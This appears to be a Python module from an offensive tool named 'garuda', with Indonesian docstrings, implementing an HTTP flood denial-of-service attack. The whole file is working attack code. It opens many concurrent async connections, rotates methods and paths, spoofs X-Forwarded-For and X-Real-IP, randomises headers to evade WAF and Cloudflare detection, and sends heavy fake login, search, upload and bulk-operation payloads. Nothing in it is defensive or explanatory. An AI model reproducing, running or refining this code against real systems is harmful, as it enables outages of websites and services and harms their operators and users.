import asyncio
import aiohttp
import socket
import random
import ssl
import time
from typing import Dict, List

from .base_attack import BaseAttack
from garuda.modules.evasions.user_agents import get_random_user_agent
from garuda.modules.evasions.referers import get_random_referer

class HttpFloodAttack(BaseAttack):
    """
    Implementasi serangan HTTP Flood dengan teknik evasion canggih.

    Serangan ini mengirimkan sejumlah besar permintaan HTTP dengan berbagai metode
    dan pattern untuk menghindari deteksi sistem proteksi modern seperti WAF/Cloudflare.
    Menggunakan header realistis, variasi request method, dan rate limiting adaptif.
    """
    
    def __init__(self, *args, **kwargs):
        """
        Inisialisasi serangan HTTP Flood dengan konfigurasi evasion.

        Args:
            *args: Arguments untuk BaseAttack
            **kwargs: Keyword arguments untuk BaseAttack
        """
        super().__init__(*args, **kwargs)
        self._session_pool: List[aiohttp.ClientSession] = []
        self._request_patterns = self._initialize_patterns()
        self._last_request_time = 0
        
    def _initialize_patterns(self) -> List[Dict]:
        """
        Menginisialisasi pattern request yang bervariasi untuk evasion.
        Menggunakan common paths untuk memaksimalkan efektivitas DOS.

        Returns:
            List[Dict]: Daftar pattern dengan method, path, dan weight
        """
        return [
            {"method": "GET", "path_suffix": "", "weight": 25},
            {"method": "POST", "path_suffix": "", "weight": 25},
            {"method": "GET", "path_suffix": "/index.php", "weight": 15},
            {"method": "POST", "path_suffix": "/search", "weight": 15},
            {"method": "GET", "path_suffix": "/login", "weight": 8},
            {"method": "POST", "path_suffix": "/login", "weight": 7},
            {"method": "HEAD", "path_suffix": "", "weight": 3},
            {"method": "OPTIONS", "path_suffix": "", "weight": 2}
        ]
    
    def _generate_realistic_headers(self) -> Dict[str, str]:
        """
        Membuat header HTTP yang realistis untuk menghindari deteksi.

        Returns:
            Dict[str, str]: Dictionary header HTTP yang natural
        """
        base_headers = {
            "User-Agent": get_random_user_agent(),
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            "Accept-Language": random.choice([
                "en-US,en;q=0.9", "en-GB,en;q=0.9", "fr-FR,fr;q=0.9", 
                "de-DE,de;q=0.9", "es-ES,es;q=0.9", "pt-BR,pt;q=0.9"
            ]),
            "Accept-Encoding": "gzip, deflate, br",
            "DNT": "1",
            "Connection": "keep-alive",
            "Upgrade-Insecure-Requests": "1",
            "Sec-Fetch-Dest": random.choice(["document", "empty", "script"]),
            "Sec-Fetch-Mode": random.choice(["navigate", "cors", "no-cors"]),
            "Sec-Fetch-Site": random.choice(["none", "same-origin", "cross-site"])
        }
        
        if random.random() < 0.8:
            base_headers["Referer"] = get_random_referer()
            
        if random.random() < 0.4:
            base_headers["Cache-Control"] = random.choice([
                "no-cache", "max-age=0", "no-store", "must-revalidate"
            ])
            
        if random.random() < 0.5:
            base_headers["X-Requested-With"] = "XMLHttpRequest"
            
        if random.random() < 0.3:
            base_headers["X-Forwarded-For"] = f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"
            
        if random.random() < 0.2:
            base_headers["X-Real-IP"] = f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"
            
        if random.random() < 0.1:
            base_headers["Content-Length"] = str(random.randint(1000000, 10000000))
            
        if random.random() < 0.15:
            base_headers["Expect"] = "100-continue"
            
        if random.random() < 0.1:
            base_headers["Transfer-Encoding"] = "chunked"
            
        return base_headers
    
    def _select_request_pattern(self) -> Dict:
        patterns = self._request_patterns
        weights = [p["weight"] for p in patterns]
        return random.choices(patterns, weights=weights)[0]
    
    async def _apply_rate_limiting(self) -> None:
        if self.stealth:
            current_time = time.monotonic()
            
            if self._last_request_time > 0:
                time_diff = current_time - self._last_request_time
                min_interval = random.uniform(0.8, 2.2)
                
                if time_diff < min_interval:
                    sleep_time = min_interval - time_diff
                    await asyncio.sleep(sleep_time)
                
            self._last_request_time = current_time
    
    async def _create_session(self) -> aiohttp.ClientSession:
        """
        Membuat session HTTP dengan konfigurasi optimal untuk penetrasi.

        Returns:
            aiohttp.ClientSession: Session yang dikonfigurasi untuk high-throughput
        """
        connector = aiohttp.TCPConnector(
            family=socket.AF_INET,
            limit=500,
            limit_per_host=100,
            ttl_dns_cache=300,
            use_dns_cache=True,
            keepalive_timeout=120,
            enable_cleanup_closed=True,
            force_close=False,
            verify_ssl=False
        )
        
        timeout = aiohttp.ClientTimeout(
            total=60,
            connect=30,
            sock_read=30
        )
        
        return aiohttp.ClientSession(
            connector=connector,
            timeout=timeout,
            skip_auto_headers={"User-Agent"},
            raise_for_status=False
        )
    
    async def _make_advanced_request(self, session: aiohttp.ClientSession):
        """
        Melakukan request HTTP dengan teknik evasion dan error handling canggih.
        Sekarang dengan retry otomatis (limit 3x per request pattern).
        """
        connection_established = False
        
        while self.is_running:
            retries = 0
            max_retries = 3
            while retries < max_retries and self.is_running:
                try:
                    await self._apply_rate_limiting()
                    pattern = self._select_request_pattern()
                    headers = self._generate_realistic_headers()
                    target_url = self.target.geturl() + pattern["path_suffix"]
                    self.stats.increment("active_connections")
                    connection_established = True
                    request_kwargs = {
                        "url": target_url,
                        "headers": headers,
                        "allow_redirects": True,
                        "max_redirects": 3
                    }
                    if pattern["method"] == "POST":
                        request_kwargs["data"] = self._generate_post_data()
                    elif pattern["method"] == "GET":
                        request_kwargs["params"] = self._generate_query_params()
                    method = getattr(session, pattern["method"].lower())
                    async with method(**request_kwargs) as response:
                        if response.status < 400:
                            self.stats.increment("sent_packets")
                            if response.status == 200:
                                try:
                                    content = await response.read()
                                except:
                                    pass
                        elif response.status == 404:
                            self.stats.increment("sent_packets")
                        elif response.status in [301, 302, 307, 308]:
                            self.stats.increment("sent_packets")
                        else:
                            self.stats.increment("failed_connections")
                    break  # sukses, keluar dari retry loop
                except aiohttp.ClientConnectorError as e:
                    self.stats.increment("failed_connections")
                    retries += 1
                    await asyncio.sleep(random.uniform(0.1, 0.5))
                except aiohttp.ClientResponseError as e:
                    if e.status in [403, 429, 503]:
                        await asyncio.sleep(random.uniform(0.5, 1.5))
                    self.stats.increment("failed_connections")
                    retries += 1
                except (aiohttp.ClientError, asyncio.TimeoutError, OSError) as e:
                    self.stats.increment("failed_connections")
                    retries += 1
                    await asyncio.sleep(random.uniform(0.05, 0.2))
                except Exception as e:
                    self.stats.increment("failed_connections")
                    retries += 1
                except asyncio.CancelledError:
                    break
                finally:
                    if connection_established:
                        self.stats.decrement("active_connections")
                        connection_established = False
            if not self.stealth:
                await asyncio.sleep(random.uniform(0.0001, 0.005))
    
    def _generate_post_data(self) -> Dict:
        """Generate realistic POST data untuk berbagai endpoint"""
        post_patterns = [
            {
                "action": "login",
                "username": f"user_{random.randint(1000, 9999)}",
                "password": f"pass_{random.randint(1000, 9999)}",
                "remember": random.choice([True, False])
            },
            {
                "action": "search",
                "query": random.choice(["product", "service", "info", "data"]) * random.randint(1, 50),
                "limit": random.randint(10, 1000),
                "offset": random.randint(0, 10000)
            },
            {
                "action": "upload",
                "filename": f"file_{random.randint(1, 999)}.txt",
                "size": random.randint(1024, 102400),
                "type": random.choice(["text", "image", "document"]),
                "data": "A" * random.randint(1024, 51200)
            },
            {
                "action": "bulk_operation",
                "items": [f"item_{i}" for i in range(random.randint(100, 1000))],
                "operation": random.choice(["delete", "update", "process"]),
                "batch_size": random.randint(500, 2000)
            }
        ]
        return random.choice(post_patterns)
    
    def _generate_query_params(self) -> Dict:
        """Generate realistic query parameters"""
        param_sets = [
            {"page": random.randint(1, 100), "size": random.choice([10, 20, 50])},
            {"category": random.choice(["news", "products", "services"]), "sort": random.choice(["date", "name", "price"])},
            {"search": f"query_{random.randint(1, 999)}", "filter": random.choice(["all", "recent", "popular"])},
            {"id": random.randint(1, 10000), "action": random.choice(["view", "edit", "delete"])},
            {}
        ]
        return random.choice(param_sets)

    async def execute(self):
        """
        Menjalankan serangan HTTP Flood dengan batch processing.

        Behavior:
            - Membagi koneksi menjadi batch untuk menghindari detection
            - Menggunakan session pool untuk optimasi koneksi
            - Menerapkan delay antar batch untuk stealth
            - Cleanup otomatis untuk semua session
        """
        self.is_running = True
        
        try:
            session = await self._create_session()
            self._session_pool.append(session)
            
            tasks = [
                self._make_advanced_request(session) 
                for _ in range(self.connections)
            ]
            
            await asyncio.gather(*tasks, return_exceptions=True)
            
        except Exception:
            self.stats.increment("failed_connections")
            
        finally:
            self.is_running = False
            await self._cleanup_sessions()
    
    async def _cleanup_sessions(self):
        for session in self._session_pool:
            if not session.closed:
                await session.close()
        self._session_pool.clear()